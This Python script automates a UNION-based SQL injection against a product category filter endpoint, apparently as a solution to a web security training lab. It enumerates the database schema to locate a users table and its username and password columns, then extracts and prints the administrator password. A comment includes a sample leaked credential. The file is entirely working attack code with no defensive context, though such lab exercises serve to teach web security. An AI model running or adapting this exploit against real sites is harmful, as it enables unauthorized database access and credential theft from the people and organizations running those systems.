import requests
import urllib3
import sys
from bs4 import BeautifulSoup
import re
urllib3.disable_warnings(
    urllib3.exceptions.InsecureRequestWarning)  # ignore TLS warnings

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


# Perform the request
def make_the_request(url, sql_payload):
    path = '/filter?category=Lifestyle'
    r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
    return r.text

# Find the users table


def sqli_users_table(url):
    sql_payload = "' UNION SELECT table_name, NULL FROM information_schema.tables--"
    res = make_the_request(url, sql_payload)
    soup = BeautifulSoup(res, 'html.parser')
    myreg_ex = re.compile(r'.*users.*')
    users_table = soup.find(text=myreg_ex)
    if users_table:
        return users_table
    else:
        return False

# Find the usernames, passwords columns from users table


def sqli_users_columns(url, users_table):
    sql_payload = "' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='%s'--" % users_table
    res = make_the_request(url, sql_payload)
    soup = BeautifulSoup(res, 'html.parser')
    username_column = soup.find(text=re.compile(r'.*username.*'))
    password_column = soup.find(text=re.compile(r'.*password.*'))
    return username_column, password_column

# Find the administrator password


'''
                           <th>administrator</th>
                            <td>cnqalsuptwtw29mm34ds</td>
'''


def sqli_admin_cred(url, users_table, username_column, password_column):
    sql_payload = "' UNION SELECT %s, %s FROM %s--" % (
        username_column, password_column, users_table)
    res = make_the_request(url, sql_payload)
    soup = BeautifulSoup(res, 'html.parser')
    admin_password = soup.body.find(
        text='administrator').parent.findNext('td').contents[0]
    return admin_password


if __name__ == "__main__":  # main method
    try:
        url = sys.argv[1].strip()

    except IndexError:  # <script.py> url
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])

    print("Looking for users table...")
    users_table = sqli_users_table(url)
    if users_table:
        print("Found the users table: %s" % users_table)
        # find column names: username, password
        username_column, password_column = sqli_users_columns(url, users_table)
        if username_column and password_column:
            print("Found the usernames column name: %s " % username_column)
            print("Found the passwords column name : %s " % password_column)

            # Step 6: finding Administrator password
            admin_password = sqli_admin_cred(
                url, users_table, username_column, password_column)
            if admin_password:
                print("[+] Found the administrator password: %s" %
                      admin_password)
            else:
                print("[-] Did not find the administrator password")
        else:
            print("Did not find the username and/or password columns")
    else:
        print("Did not find the users table")
